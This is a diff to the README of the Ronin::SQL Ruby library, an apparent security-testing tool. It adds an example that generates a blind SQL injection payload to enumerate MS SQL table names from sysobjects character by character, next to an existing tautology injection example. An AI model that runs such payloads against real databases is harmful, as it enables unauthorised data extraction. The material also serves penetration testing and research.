@@ -106,6 +106,22 @@ Dumping all values of a column:
     puts sqli.to_sql
     # 1' OR username IS NOT NULL OR username='
 
+Enumerate through database table names:
+
+    sqli = Ronin::SQL::Injection.new
+    sqli.and {
+      ascii(
+        lower(
+          substring(
+            select(:name).top(1).from(sysobjects).where { xtype == 'U' }, 1, 1
+          )
+        )
+      )
+    }
+    puts sqli.to_sql
+    # 1 AND ASCII(LOWER(SUBSTRING((SELECT name TOP 1 FROM sysobjects WHERE xtype='U'),1,1)))
+
+
 ## Requirements
 
 * [Ruby] >= 1.9.1
